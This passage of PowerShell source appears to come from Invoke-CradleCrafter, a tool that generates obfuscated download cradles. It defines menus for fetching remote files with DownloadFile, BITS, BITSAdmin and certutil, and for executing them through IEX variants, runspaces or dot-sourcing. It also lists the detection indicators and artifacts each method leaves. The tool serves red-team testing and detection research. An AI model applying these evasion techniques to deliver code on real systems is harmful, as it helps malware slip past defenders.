    $MenuLevel_Memory_Certutil_Cmdlet            += , @($LineSpacing, '2' , "PS Get-Command   --> <Get-Command>/<GCM>"                     , @('Out-Cradle', $CradleType, 'SelectObject', 2))
    $MenuLevel_Memory_Certutil_Cmdlet            += , @($LineSpacing, '3' , "PS1.0 GetCmdlet  --> <`$ExecutionContext>..."                 , @('Out-Cradle', $CradleType, 'SelectObject', 3))
    
    $MenuLevel_Memory_Certutil_Invoke             =   @()
    $MenuLevel_Memory_Certutil_Invoke            += , @($LineSpacing, '1 ' , "No Invoke         --> For <testing> download sans IEX"       , @('Out-Cradle', $CradleType, 'Invoke', 1))
    $MenuLevel_Memory_Certutil_Invoke            += , @($LineSpacing, '2 ' , "PS IEX            --> <IEX/Invoke-Expression>"               , @('Out-Cradle', $CradleType, 'Invoke', 2))
    $MenuLevel_Memory_Certutil_Invoke            += , @($LineSpacing, '3 ' , "PS Get-Alias      --> <Get-Alias>/<GAL>"                     , @('Out-Cradle', $CradleType, 'Invoke', 3))
    $MenuLevel_Memory_Certutil_Invoke            += , @($LineSpacing, '4 ' , "PS Get-Command    --> <Get-Command>/<GCM>"                   , @('Out-Cradle', $CradleType, 'Invoke', 4))
    $MenuLevel_Memory_Certutil_Invoke            += , @($LineSpacing, '5 ' , "PS1.0 GetCmdlet   --> <`$ExecutionContext>..."               , @('Out-Cradle', $CradleType, 'Invoke', 5))
    $MenuLevel_Memory_Certutil_Invoke            += , @($LineSpacing, '6 ' , "PS1.0 Invoke      --> <`$ExecutionContext>..."               , @('Out-Cradle', $CradleType, 'Invoke', 6))
    $MenuLevel_Memory_Certutil_Invoke            += , @($LineSpacing, '7 ' , "ScriptBlock+ICM   --> <ICM/Invoke-Command/.Invoke()>"        , @('Out-Cradle', $CradleType, 'Invoke', 7))
    $MenuLevel_Memory_Certutil_Invoke            += , @($LineSpacing, '8 ' , "PS Runspace       --> <[PowerShell]::Create()> (StdOut)"     , @('Out-Cradle', $CradleType, 'Invoke', 8))
    $MenuLevel_Memory_Certutil_Invoke            += , @($LineSpacing, '9 ' , "Concatenated IEX  --> <.(`$env:ComSpec[4,15,25]-Join'')>"    , @('Out-Cradle', $CradleType, 'Invoke', 9))
    $MenuLevel_Memory_Certutil_Invoke            += , @($LineSpacing, '10' , "Invoke-AsWorkflow --> <Invoke-AsWorkflow> (PS3.0+)"          , @('Out-Cradle', $CradleType, 'Invoke', 10))

    $MenuLevel_Memory_Certutil_All                =   @()
    $MenuLevel_Memory_Certutil_All               += , @($LineSpacing, '1' , "Execute <ALL> Token obfuscation techniques (random order)"    , @('Out-Cradle', $CradleType, 'All', 1))
    
    # Set values for Show-MenuContext to be displayed when each new cradle type is entered into.
    $MenuContext_Disk_PsWebFile                   =   @()
    $MenuContext_Disk_PsWebFile                  += , @('Name         ','PsWebFile')
    $MenuContext_Disk_PsWebFile                  += , @('Description  ','Downloads the resource with the specified URI to a local file')
    $MenuContext_Disk_PsWebFile                  += , @('Compatibility','PS 2.0+')
    $MenuContext_Disk_PsWebFile                  += , @('Dependencies ','N/A')
    $MenuContext_Disk_PsWebFile                  += , @('Footprint    ','Disk-based')
    $MenuContext_Disk_PsWebFile                  += , @('Indicators   ',@('powershell.exe loads C:\Windows\System32\rasman.dll','powershell.exe loads C:\Windows\System32\rasapi32.dll'))
    $MenuContext_Disk_PsWebFile                  += , @('Artifacts    ',@('C:\Windows\Prefetch\POWERSHELL.EXE-********.pf','HKLM\SOFTWARE\Microsoft\Tracing\powershell_RASMANCS','HKLM\SOFTWARE\Microsoft\Tracing\powershell_RASAPI32'))
    $MenuContext_Disk_PsWebFile                  += , @('User-Agent   ',@('None','UA generally trivial to change'))

    $CradleType = 20
        
    $MenuLevel_Disk_PsWebFile                     =   @()
    $MenuLevel_Disk_PsWebFile                    += , @($LineSpacing, 'Rearrange' , '<Rearrange> syntax structure')
    $MenuLevel_Disk_PsWebFile                    += , @($LineSpacing, 'Cmdlet   ' , '<New-Object>')
    $MenuLevel_Disk_PsWebFile                    += , @($LineSpacing, 'Method   ' , '<DownloadFile>')
    $MenuLevel_Disk_PsWebFile                    += , @($LineSpacing, 'Invoke   ' , '<IEX>')
    $MenuLevel_Disk_PsWebFile                    += , @($LineSpacing, 'All      ' , 'Select <All> choices from above (random order)')

    $MenuLevel_Disk_PsWebFile_Rearrange           =   @()
    $MenuLevel_Disk_PsWebFile_Rearrange          += , @($LineSpacing, '1' , "Default         --> <Default> syntax arrangement"             , @('Out-Cradle', $CradleType, 'Rearrange', 1))
    $MenuLevel_Disk_PsWebFile_Rearrange          += , @($LineSpacing, '2' , "Multi-Variable  --> <Logical> variable names and syntax"      , @('Out-Cradle', $CradleType, 'Rearrange', 2))
    $MenuLevel_Disk_PsWebFile_Rearrange          += , @($LineSpacing, '3' , "Random-Variable --> <Random> variable names and syntax"       , @('Out-Cradle', $CradleType, 'Rearrange', 3))

    $MenuLevel_Disk_PsWebFile_Cmdlet              =   @()
    $MenuLevel_Disk_PsWebFile_Cmdlet             += , @($LineSpacing, '1' , "PS New-Object   --> <New-Object>"                             , @('Out-Cradle', $CradleType, 'NewObject', 1))
    $MenuLevel_Disk_PsWebFile_Cmdlet             += , @($LineSpacing, '2' , "PS Get-Command  --> <Get-Command>/<GCM>"                      , @('Out-Cradle', $CradleType, 'NewObject', 2))
    $MenuLevel_Disk_PsWebFile_Cmdlet             += , @($LineSpacing, '3' , "PS1.0 GetCmdlet --> <`$ExecutionContext>..."                  , @('Out-Cradle', $CradleType, 'NewObject', 3))
    
    $MenuLevel_Disk_PsWebFile_Method              =   @()
    $MenuLevel_Disk_PsWebFile_Method             += , @($LineSpacing, '1' , "PS DownloadFile --> <DownloadFile>"                           , @('Out-Cradle', $CradleType, 'DownloadFile', 1))
    $MenuLevel_Disk_PsWebFile_Method             += , @($LineSpacing, '2' , "PS PsObject     --> <.PsObject.Methods>"                      , @('Out-Cradle', $CradleType, 'DownloadFile', 2))
    $MenuLevel_Disk_PsWebFile_Method             += , @($LineSpacing, '3' , "PS Get-Member   --> <| Get-Member>"                           , @('Out-Cradle', $CradleType, 'DownloadFile', 3))
    
    $MenuLevel_Disk_PsWebFile_Invoke              =   @()
    $MenuLevel_Disk_PsWebFile_Invoke             += , @($LineSpacing, '1 ' , "No Invoke         --> For <testing> download sans IEX"       , @('Out-Cradle', $CradleType, 'Invoke', 1))
    $MenuLevel_Disk_PsWebFile_Invoke             += , @($LineSpacing, '2 ' , "PS IEX            --> <IEX/Invoke-Expression>"               , @('Out-Cradle', $CradleType, 'Invoke', 2))
    $MenuLevel_Disk_PsWebFile_Invoke             += , @($LineSpacing, '3 ' , "PS Get-Alias      --> <Get-Alias>/<GAL>"                     , @('Out-Cradle', $CradleType, 'Invoke', 3))
    $MenuLevel_Disk_PsWebFile_Invoke             += , @($LineSpacing, '4 ' , "PS Get-Command    --> <Get-Command>/<GCM>"                   , @('Out-Cradle', $CradleType, 'Invoke', 4))
    $MenuLevel_Disk_PsWebFile_Invoke             += , @($LineSpacing, '5 ' , "PS1.0 GetCmdlet   --> <`$ExecutionContext>..."               , @('Out-Cradle', $CradleType, 'Invoke', 5))
    $MenuLevel_Disk_PsWebFile_Invoke             += , @($LineSpacing, '6 ' , "PS1.0 Invoke      --> <`$ExecutionContext>..."               , @('Out-Cradle', $CradleType, 'Invoke', 6))
    $MenuLevel_Disk_PsWebFile_Invoke             += , @($LineSpacing, '7 ' , "ScriptBlock+ICM   --> <ICM/Invoke-Command/.Invoke()>"        , @('Out-Cradle', $CradleType, 'Invoke', 7))
    $MenuLevel_Disk_PsWebFile_Invoke             += , @($LineSpacing, '8 ' , "PS Runspace       --> <[PowerShell]::Create()> (StdOut)"     , @('Out-Cradle', $CradleType, 'Invoke', 8))
    $MenuLevel_Disk_PsWebFile_Invoke             += , @($LineSpacing, '9 ' , "Concatenated IEX  --> <.(`$env:ComSpec[4,15,25]-Join'')>"    , @('Out-Cradle', $CradleType, 'Invoke', 9))
    $MenuLevel_Disk_PsWebFile_Invoke             += , @($LineSpacing, '10' , "Invoke-AsWorkflow --> <Invoke-AsWorkflow> (PS3.0+)"          , @('Out-Cradle', $CradleType, 'Invoke', 10))
    $MenuLevel_Disk_PsWebFile_Invoke             += , @($LineSpacing, '11' , "Dot-Source        --> <.> ./file.ps1"                        , @('Out-Cradle', $CradleType, 'Invoke', 11))
    $MenuLevel_Disk_PsWebFile_Invoke             += , @($LineSpacing, '12' , "Import-Module     --> <Import-Module>/<IPMO> (StdOut)"       , @('Out-Cradle', $CradleType, 'Invoke', 12))
    
    $MenuLevel_Disk_PsWebFile_All                 =   @()
    $MenuLevel_Disk_PsWebFile_All                += , @($LineSpacing, '1' , "Execute <ALL> Token obfuscation techniques (random order)"    , @('Out-Cradle', $CradleType, 'All', 1))
    
    # Set values for Show-MenuContext to be displayed when each new cradle type is entered into.
    $MenuContext_Disk_PsBits                      =   @()
    $MenuContext_Disk_PsBits                     += , @('Name         ','PsBits')
    $MenuContext_Disk_PsBits                     += , @('Description  ',@('Downloads the resource to a local file via BITS PowerShell cmdlet','Works in CLM (Constrained Language Mode)'))
    $MenuContext_Disk_PsBits                     += , @('Compatibility','PS 3.0+')
    $MenuContext_Disk_PsBits                     += , @('Dependencies ','Payload must return file size for BITS to work (no URL shorteners, etc.)')
    $MenuContext_Disk_PsBits                     += , @('Footprint    ','Disk-based')
    $MenuContext_Disk_PsBits                     += , @('Indicators   ',@('BITS event log','powershell.exe loads C:\Windows\System32\BitsProxy.dll'))
    $MenuContext_Disk_PsBits                     += , @('Artifacts    ',@('C:\Windows\System32\winevt\Logs\Microsoft-Windows-Bits-Client%4Operational.evtx','C:\Windows\Prefetch\POWERSHELL.EXE-********.pf'))
    $MenuContext_Disk_PsBits                     += , @('User-Agent   ','Microsoft BITS/*')

    $CradleType = 21
        
    $MenuLevel_Disk_PsBits                        =   @()
    $MenuLevel_Disk_PsBits                       += , @($LineSpacing, 'Rearrange' , '<Rearrange> syntax structure')
    $MenuLevel_Disk_PsBits                       += , @($LineSpacing, 'Cmdlet   ' , '<Start-BitsTransfer>')
    $MenuLevel_Disk_PsBits                       += , @($LineSpacing, 'Flag     ' , '<-So[urce]> (flag substring)')
    $MenuLevel_Disk_PsBits                       += , @($LineSpacing, 'Flag2    ' , '<-Dest[ination]> (flag substring)')
    $MenuLevel_Disk_PsBits                       += , @($LineSpacing, 'Invoke   ' , '<IEX>')
    $MenuLevel_Disk_PsBits                       += , @($LineSpacing, 'All      ' , 'Select <All> choices from above (random order)')

    $MenuLevel_Disk_PsBits_Rearrange              =   @()
    $MenuLevel_Disk_PsBits_Rearrange             += , @($LineSpacing, '1' , "Default         --> <Default> syntax arrangement"             , @('Out-Cradle', $CradleType, 'Rearrange', 1))
    $MenuLevel_Disk_PsBits_Rearrange             += , @($LineSpacing, '2' , "Multi-Variable  --> <Logical> variable names and syntax"      , @('Out-Cradle', $CradleType, 'Rearrange', 2))
    $MenuLevel_Disk_PsBits_Rearrange             += , @($LineSpacing, '3' , "Random-Variable --> <Random> variable names and syntax"       , @('Out-Cradle', $CradleType, 'Rearrange', 3))
    
    $MenuLevel_Disk_PsBits_Cmdlet                 =   @()
    $MenuLevel_Disk_PsBits_Cmdlet                += , @($LineSpacing, '1' , "PS Start-BitsTransfer --> <Start-BitsTransfer>"               , @('Out-Cradle', $CradleType, 'StartBitsTransfer', 1))
    $MenuLevel_Disk_PsBits_Cmdlet                += , @($LineSpacing, '2' , "PS Get-Command        --> <Get-Command>/<GCM>"                , @('Out-Cradle', $CradleType, 'StartBitsTransfer', 2))
    
    $MenuLevel_Disk_PsBits_Flag                   =   @()
    $MenuLevel_Disk_PsBits_Flag                  += , @($LineSpacing, '1' , "No Flag        --> <No Flag>"                                 , @('Out-Cradle', $CradleType, 'SourceFlag', 1))
    $MenuLevel_Disk_PsBits_Flag                  += , @($LineSpacing, '2' , "Full Flag      --> <-Source>"                                 , @('Out-Cradle', $CradleType, 'SourceFlag', 2))
    $MenuLevel_Disk_PsBits_Flag                  += , @($LineSpacing, '3' , "Flag Substring --> <-So[urce]>"                               , @('Out-Cradle', $CradleType, 'SourceFlag', 3))
    
    $MenuLevel_Disk_PsBits_Flag2                  =   @()
    $MenuLevel_Disk_PsBits_Flag2                 += , @($LineSpacing, '1' , "No Flag        --> <No Flag>"                                 , @('Out-Cradle', $CradleType, 'DestinationFlag', 1))
    $MenuLevel_Disk_PsBits_Flag2                 += , @($LineSpacing, '2' , "Full Flag      --> <-Destination>"                            , @('Out-Cradle', $CradleType, 'DestinationFlag', 2))
    $MenuLevel_Disk_PsBits_Flag2                 += , @($LineSpacing, '3' , "Flag Substring --> <-Dest[ination]>"                          , @('Out-Cradle', $CradleType, 'DestinationFlag', 3))
    
    $MenuLevel_Disk_PsBits_Invoke                 =   @()
    $MenuLevel_Disk_PsBits_Invoke                += , @($LineSpacing, '1 ' , "No Invoke         --> For <testing> download sans IEX"       , @('Out-Cradle', $CradleType, 'Invoke', 1))
    $MenuLevel_Disk_PsBits_Invoke                += , @($LineSpacing, '2 ' , "PS IEX            --> <IEX/Invoke-Expression>"               , @('Out-Cradle', $CradleType, 'Invoke', 2))
    $MenuLevel_Disk_PsBits_Invoke                += , @($LineSpacing, '3 ' , "PS Get-Alias      --> <Get-Alias>/<GAL>"                     , @('Out-Cradle', $CradleType, 'Invoke', 3))
    $MenuLevel_Disk_PsBits_Invoke                += , @($LineSpacing, '4 ' , "PS Get-Command    --> <Get-Command>/<GCM>"                   , @('Out-Cradle', $CradleType, 'Invoke', 4))
    $MenuLevel_Disk_PsBits_Invoke                += , @($LineSpacing, '5 ' , "PS1.0 GetCmdlet   --> <`$ExecutionContext>..."               , @('Out-Cradle', $CradleType, 'Invoke', 5))
    $MenuLevel_Disk_PsBits_Invoke                += , @($LineSpacing, '6 ' , "PS1.0 Invoke      --> <`$ExecutionContext>..."               , @('Out-Cradle', $CradleType, 'Invoke', 6))
    $MenuLevel_Disk_PsBits_Invoke                += , @($LineSpacing, '7 ' , "ScriptBlock+ICM   --> <ICM/Invoke-Command/.Invoke()>"        , @('Out-Cradle', $CradleType, 'Invoke', 7))
    $MenuLevel_Disk_PsBits_Invoke                += , @($LineSpacing, '8 ' , "PS Runspace       --> <[PowerShell]::Create()> (StdOut)"     , @('Out-Cradle', $CradleType, 'Invoke', 8))
    $MenuLevel_Disk_PsBits_Invoke                += , @($LineSpacing, '9 ' , "Concatenated IEX  --> <.(`$env:ComSpec[4,15,25]-Join'')>"    , @('Out-Cradle', $CradleType, 'Invoke', 9))
    $MenuLevel_Disk_PsBits_Invoke                += , @($LineSpacing, '10' , "Invoke-AsWorkflow --> <Invoke-AsWorkflow> (PS3.0+)"          , @('Out-Cradle', $CradleType, 'Invoke', 10))
    $MenuLevel_Disk_PsBits_Invoke                += , @($LineSpacing, '11' , "Dot-Source        --> <.> ./file.ps1"                        , @('Out-Cradle', $CradleType, 'Invoke', 11))
    $MenuLevel_Disk_PsBits_Invoke                += , @($LineSpacing, '12' , "Import-Module     --> <Import-Module>/<IPMO> (StdOut)"       , @('Out-Cradle', $CradleType, 'Invoke', 12))
    
    $MenuLevel_Disk_PsBits_All                    =   @()
    $MenuLevel_Disk_PsBits_All                   += , @($LineSpacing, '1' , "Execute <ALL> Token obfuscation techniques (random order)"    , @('Out-Cradle', $CradleType, 'All', 1))
    
    # Set values for Show-MenuContext to be displayed when each new cradle type is entered into.
    $MenuContext_Disk_BITSAdmin                   =   @()
    $MenuContext_Disk_BITSAdmin                  += , @('Name         ','BITSAdmin')
    $MenuContext_Disk_BITSAdmin                  += , @('Description  ',@('Downloads the resource to a local file via BITSAdmin.exe','Works in CLM (Constrained Language Mode)'))
    $MenuContext_Disk_BITSAdmin                  += , @('Compatibility','PS 2.0+')
    $MenuContext_Disk_BITSAdmin                  += , @('Dependencies ','Payload must return file size for BITS to work (no URL shorteners, etc.)')
    $MenuContext_Disk_BITSAdmin                  += , @('Footprint    ','Disk-based')
    $MenuContext_Disk_BITSAdmin                  += , @('Indicators   ',@('BITS Event Log','powershell.exe spawns BITSAdmin.exe'))
    $MenuContext_Disk_BITSAdmin                  += , @('Artifacts    ',@('C:\Windows\System32\winevt\Logs\Microsoft-Windows-Bits-Client%4Operational.evtx','AppCompat Cache'))
    $MenuContext_Disk_BITSAdmin                  += , @('User-Agent   ','Microsoft BITS/*')

    $CradleType = 22
        
    $MenuLevel_Disk_BITSAdmin                     =   @()
    $MenuLevel_Disk_BITSAdmin                    += , @($LineSpacing, 'Rearrange' , '<Rearrange> syntax structure')
    $MenuLevel_Disk_BITSAdmin                    += , @($LineSpacing, 'Flag     ' , '</D[ownload]> (flag substring)')
    $MenuLevel_Disk_BITSAdmin                    += , @($LineSpacing, 'Invoke   ' , '<IEX>')
    $MenuLevel_Disk_BITSAdmin                    += , @($LineSpacing, 'All      ' , 'Select <All> choices from above (random order)')

    $MenuLevel_Disk_BITSAdmin_Rearrange           =   @()
    $MenuLevel_Disk_BITSAdmin_Rearrange          += , @($LineSpacing, '1' , "Default         --> <Default> syntax arrangement"             , @('Out-Cradle', $CradleType, 'Rearrange', 1))
    $MenuLevel_Disk_BITSAdmin_Rearrange          += , @($LineSpacing, '2' , "Multi-Variable  --> <Logical> variable names and syntax"      , @('Out-Cradle', $CradleType, 'Rearrange', 2))
    $MenuLevel_Disk_BITSAdmin_Rearrange          += , @($LineSpacing, '3' , "Random-Variable --> <Random> variable names and syntax"       , @('Out-Cradle', $CradleType, 'Rearrange', 3))
    
    $MenuLevel_Disk_BITSAdmin_Flag                =   @()
    $MenuLevel_Disk_BITSAdmin_Flag               += , @($LineSpacing, '1' , "Full Flag      --> </Download>"                               , @('Out-Cradle', $CradleType, 'DownloadFlag', 1))
    $MenuLevel_Disk_BITSAdmin_Flag               += , @($LineSpacing, '2' , "Flag Substring --> </D[ownload]>"                             , @('Out-Cradle', $CradleType, 'DownloadFlag', 2))
    $MenuLevel_Disk_BITSAdmin_Flag               += , @($LineSpacing, '3' , "Empty Flag     --> </>"                                       , @('Out-Cradle', $CradleType, 'DownloadFlag', 3))
    $MenuLevel_Disk_BITSAdmin_Flag               += , @($LineSpacing, '4' , "Decoy Flag     --> </Troll=Strong>"                           , @('Out-Cradle', $CradleType, 'DownloadFlag', 4))
    $MenuLevel_Disk_BITSAdmin_Flag               += , @($LineSpacing, '5' , "Random Flag    --> </sjoijfkj>"                               , @('Out-Cradle', $CradleType, 'DownloadFlag', 5))
    
    $MenuLevel_Disk_BITSAdmin_Invoke              =   @()
    $MenuLevel_Disk_BITSAdmin_Invoke             += , @($LineSpacing, '1 ' , "No Invoke         --> For <testing> download sans IEX"       , @('Out-Cradle', $CradleType, 'Invoke', 1))
    $MenuLevel_Disk_BITSAdmin_Invoke             += , @($LineSpacing, '2 ' , "PS IEX            --> <IEX/Invoke-Expression>"               , @('Out-Cradle', $CradleType, 'Invoke', 2))
    $MenuLevel_Disk_BITSAdmin_Invoke             += , @($LineSpacing, '3 ' , "PS Get-Alias      --> <Get-Alias>/<GAL>"                     , @('Out-Cradle', $CradleType, 'Invoke', 3))
    $MenuLevel_Disk_BITSAdmin_Invoke             += , @($LineSpacing, '4 ' , "PS Get-Command    --> <Get-Command>/<GCM>"                   , @('Out-Cradle', $CradleType, 'Invoke', 4))
    $MenuLevel_Disk_BITSAdmin_Invoke             += , @($LineSpacing, '5 ' , "PS1.0 GetCmdlet   --> <`$ExecutionContext>..."               , @('Out-Cradle', $CradleType, 'Invoke', 5))
    $MenuLevel_Disk_BITSAdmin_Invoke             += , @($LineSpacing, '6 ' , "PS1.0 Invoke      --> <`$ExecutionContext>..."               , @('Out-Cradle', $CradleType, 'Invoke', 6))
    $MenuLevel_Disk_BITSAdmin_Invoke             += , @($LineSpacing, '7 ' , "ScriptBlock+ICM   --> <ICM/Invoke-Command/.Invoke()>"        , @('Out-Cradle', $CradleType, 'Invoke', 7))
    $MenuLevel_Disk_BITSAdmin_Invoke             += , @($LineSpacing, '8 ' , "PS Runspace       --> <[PowerShell]::Create()> (StdOut)"     , @('Out-Cradle', $CradleType, 'Invoke', 8))
    $MenuLevel_Disk_BITSAdmin_Invoke             += , @($LineSpacing, '9 ' , "Concatenated IEX  --> <.(`$env:ComSpec[4,15,25]-Join'')>"    , @('Out-Cradle', $CradleType, 'Invoke', 9))
    $MenuLevel_Disk_BITSAdmin_Invoke             += , @($LineSpacing, '10' , "Invoke-AsWorkflow --> <Invoke-AsWorkflow> (PS3.0+)"          , @('Out-Cradle', $CradleType, 'Invoke', 10))
    $MenuLevel_Disk_BITSAdmin_Invoke             += , @($LineSpacing, '11' , "Dot-Source        --> <.> ./file.ps1"                        , @('Out-Cradle', $CradleType, 'Invoke', 11))
    $MenuLevel_Disk_BITSAdmin_Invoke             += , @($LineSpacing, '12' , "Import-Module     --> <Import-Module>/<IPMO> (StdOut)"       , @('Out-Cradle', $CradleType, 'Invoke', 12))
    
    $MenuLevel_Disk_BITSAdmin_All                 =   @()
    $MenuLevel_Disk_BITSAdmin_All                += , @($LineSpacing, '1' , "Execute <ALL> Token obfuscation techniques (random order)"    , @('Out-Cradle', $CradleType, 'All', 1))
    
    # Set values for Show-MenuContext to be displayed when each new cradle type is entered into.
    $MenuContext_Disk_Certutil                    =   @()
    $MenuContext_Disk_Certutil                   += , @('Name         ','Certutil')
    $MenuContext_Disk_Certutil                   += , @('Description  ',@('Downloads the resource to a local file via certutil.exe','Works in CLM (Constrained Language Mode)'))
    $MenuContext_Disk_Certutil                   += , @('Compatibility','PS 2.0+')
    $MenuContext_Disk_Certutil                   += , @('Dependencies ','Certutil.exe')
    $MenuContext_Disk_Certutil                   += , @('Footprint    ','Disk-based')
    $MenuContext_Disk_Certutil                   += , @('Indicators   ',@('powershell.exe spawns certutil.exe','certutil.exe makes network connection instead of powershell.exe'))
    $MenuContext_Disk_Certutil                   += , @('Artifacts    ',@('C:\Windows\Prefetch\CERTUTIL.EXE-********.pf','AppCompat Cache'))
    $MenuContext_Disk_Certutil                   += , @('User-Agent   ',@('CertUtil URL Agent','Microsoft-CryptoAPI/*'))

    $CradleType = 23
        
    $MenuLevel_Disk_Certutil                      =   @()
    $MenuLevel_Disk_Certutil                     += , @($LineSpacing, 'Rearrange' , '<Rearrange> syntax structure')
    $MenuLevel_Disk_Certutil                     += , @($LineSpacing, 'Invoke   ' , '<IEX>')
    $MenuLevel_Disk_Certutil                     += , @($LineSpacing, 'All      ' , 'Select <All> choices from above (random order)')

    $MenuLevel_Disk_Certutil_Rearrange            =   @()
    $MenuLevel_Disk_Certutil_Rearrange           += , @($LineSpacing, '1' , "Default         --> <Default> syntax arrangement"             , @('Out-Cradle', $CradleType, 'Rearrange', 1))
    $MenuLevel_Disk_Certutil_Rearrange           += , @($LineSpacing, '2' , "Multi-Variable  --> <Logical> variable names and syntax"      , @('Out-Cradle', $CradleType, 'Rearrange', 2))
    $MenuLevel_Disk_Certutil_Rearrange           += , @($LineSpacing, '3' , "Random-Variable --> <Random> variable names and syntax"       , @('Out-Cradle', $CradleType, 'Rearrange', 3))

    $MenuLevel_Disk_Certutil_Invoke               =   @()
    $MenuLevel_Disk_Certutil_Invoke              += , @($LineSpacing, '1 ' , "No Invoke         --> For <testing> download sans IEX"       , @('Out-Cradle', $CradleType, 'Invoke', 1))
    $MenuLevel_Disk_Certutil_Invoke              += , @($LineSpacing, '2 ' , "PS IEX            --> <IEX/Invoke-Expression>"               , @('Out-Cradle', $CradleType, 'Invoke', 2))
    $MenuLevel_Disk_Certutil_Invoke              += , @($LineSpacing, '3 ' , "PS Get-Alias      --> <Get-Alias>/<GAL>"                     , @('Out-Cradle', $CradleType, 'Invoke', 3))
    $MenuLevel_Disk_Certutil_Invoke              += , @($LineSpacing, '4 ' , "PS Get-Command    --> <Get-Command>/<GCM>"                   , @('Out-Cradle', $CradleType, 'Invoke', 4))
    $MenuLevel_Disk_Certutil_Invoke              += , @($LineSpacing, '5 ' , "PS1.0 GetCmdlet   --> <`$ExecutionContext>..."               , @('Out-Cradle', $CradleType, 'Invoke', 5))
    $MenuLevel_Disk_Certutil_Invoke              += , @($LineSpacing, '6 ' , "PS1.0 Invoke      --> <`$ExecutionContext>..."               , @('Out-Cradle', $CradleType, 'Invoke', 6))
    $MenuLevel_Disk_Certutil_Invoke              += , @($LineSpacing, '7 ' , "ScriptBlock+ICM   --> <ICM/Invoke-Command/.Invoke()>"        , @('Out-Cradle', $CradleType, 'Invoke', 7))
    $MenuLevel_Disk_Certutil_Invoke              += , @($LineSpacing, '8 ' , "PS Runspace       --> <[PowerShell]::Create()> (StdOut)"     , @('Out-Cradle', $CradleType, 'Invoke', 8))
    $MenuLevel_Disk_Certutil_Invoke              += , @($LineSpacing, '9 ' , "Concatenated IEX  --> <.(`$env:ComSpec[4,15,25]-Join'')>"    , @('Out-Cradle', $CradleType, 'Invoke', 9))
    $MenuLevel_Disk_Certutil_Invoke              += , @($LineSpacing, '10' , "Invoke-AsWorkflow --> <Invoke-AsWorkflow> (PS3.0+)"          , @('Out-Cradle', $CradleType, 'Invoke', 10))
    $MenuLevel_Disk_Certutil_Invoke              += , @($LineSpacing, '11' , "Dot-Source        --> <.> ./file.ps1"                        , @('Out-Cradle', $CradleType, 'Invoke', 11))
    $MenuLevel_Disk_Certutil_Invoke              += , @($LineSpacing, '12' , "Import-Module     --> <Import-Module>/<IPMO> (StdOut)"       , @('Out-Cradle', $CradleType, 'Invoke', 12))
    
    $MenuLevel_Disk_Certutil_All                  =   @()
    $MenuLevel_Disk_Certutil_All                 += , @($LineSpacing, '1' , "Execute <ALL> Token obfuscation techniques (random order)"    , @('Out-Cradle', $CradleType, 'All', 1))

    # Input options to display non-interactive menus or perform actions.
    $TutorialInputOptions         = @(@('tutorial')                            , "<Tutorial> of how to use this tool        `t  ")
    $MenuInputOptionsShowHelp     = @(@('help','get-help','?','-?','/?','menu'), "Show this <Help> Menu                     `t  ")
    $MenuInputOptionsShowOptions  = @(@('show options','show','options')       , "<Show options> for cradle to obfuscate    `t  ")
    $ClearScreenInputOptions      = @(@('clear','clear-host','cls')            , "<Clear> screen                            `t  ")
    $CopyToClipboardInputOptions  = @(@('copy','clip','clipboard')             , "<Copy> ObfuscatedCradle to clipboard      `t  ")
    $OutputToDiskInputOptions     = @(@('out')                                 , "Write ObfuscatedCradle <Out> to disk      `t  ")
    $ExecutionInputOptions        = @(@('exec','execute','test','run')         , "<Execute> ObfuscatedCradle locally        `t  ")
    $ResetObfuscationInputOptions = @(@('reset')                               , "<Reset> ALL obfuscation for ObfuscatedCradle`t  ")
    $UndoObfuscationInputOptions  = @(@('undo')                                , "<Undo> LAST obfuscation for ObfuscatedCradle`t  ")
    $BackCommandInputOptions      = @(@('back','cd ..')                        , "Go <Back> to previous obfuscation menu    `t  ")
    $ExitCommandInputOptions      = @(@('quit','exit')                         , "<Quit> Invoke-CradleCrafter               `t  ")
    $HomeMenuInputOptions         = @(@('home','main')                         , "Return to <Home> Menu                     `t  ")
    # For Version 1.0 ASCII art is not necessary.
    #$ShowAsciiArtInputOptions     = @(@('ascii')                               , "Display random <ASCII> art for the lulz :)`t")
    
    # Add all above input options lists to be displayed in SHOW OPTIONS menu.
    $AllAvailableInputOptionsLists   = @()
    $AllAvailableInputOptionsLists  += , $TutorialInputOptions
    $AllAvailableInputOptionsLists  += , $MenuInputOptionsShowHelp
    $AllAvailableInputOptionsLists  += , $MenuInputOptionsShowOptions
    $AllAvailableInputOptionsLists  += , $ClearScreenInputOptions
    $AllAvailableInputOptionsLists  += , $ExecutionInputOptions
    $AllAvailableInputOptionsLists  += , $CopyToClipboardInputOptions
    $AllAvailableInputOptionsLists  += , $OutputToDiskInputOptions
    $AllAvailableInputOptionsLists  += , $ResetObfuscationInputOptions
    $AllAvailableInputOptionsLists  += , $UndoObfuscationInputOptions
    $AllAvailableInputOptionsLists  += , $BackCommandInputOptions    
    $AllAvailableInputOptionsLists  += , $ExitCommandInputOptions
    $AllAvailableInputOptionsLists  += , $HomeMenuInputOptions
    # For Version 1.0 ASCII art is not necessary.
    #$AllAvailableInputOptionsLists  += , $ShowAsciiArtInputOptions

    # Input options to change interactive menus.
    $ExitInputOptions = $ExitCommandInputOptions[0]
    $MenuInputOptions = $BackCommandInputOptions[0]

    # Since not everybody finds the ASCII art amusing then we will give users the option to skip it.
    If(!$PSBoundParameters['Quiet'])
    {  
        # Obligatory ASCII Art.
        Show-AsciiArt
        Start-Sleep -Seconds 2
    }

    # Show Help Menu once at beginning of script.
    Show-HelpMenu
    
    # Main loop for user interaction. Show-Menu function displays current function along with acceptable input options (defined in arrays instantiated above).
    # User input and validation is handled within Show-Menu.
    $MenuContext = ''
    $LastMenu = ''
    $Script:LastContextShift = ''
    $UserResponse = ''
    While($ExitInputOptions -NotContains ([String]$UserResponse).ToLower())
    {
        $UserResponse = ([String]$UserResponse).Trim()

        If($HomeMenuInputOptions[0] -Contains ([String]$UserResponse).ToLower())
        {
            $UserResponse = ''
        }

        # Display menu if it is defined in a menu variable with $UserResponse in the variable name.
        If(Test-Path ('Variable:' + "MenuLevel$UserResponse"))
        {
            $CurrentMenuContext = $UserResponse.SubString($UserResponse.IndexOf('_')+1).Split('_') -Join '_'

            # Display information about current cradle if we entered it from the parent menu (as opposed to backing into the menu).
            If(($UserResponse.Split('_').Count -eq 3) -AND !$LastMenu.Contains('_'))
            {
                Write-Host "`n"
                Show-MenuContext "MenuContext_$CurrentMenuContext"

                If($CurrentMenuContext -ne $Script:LastContextShift)
                {
                    # Extract Cradle integer value from cradle's Invoke menu array and store in $Cradle variable.
                    # We will need this value set to current cradle to properly call Invoke-OutCradle to set default value for this new cradle.
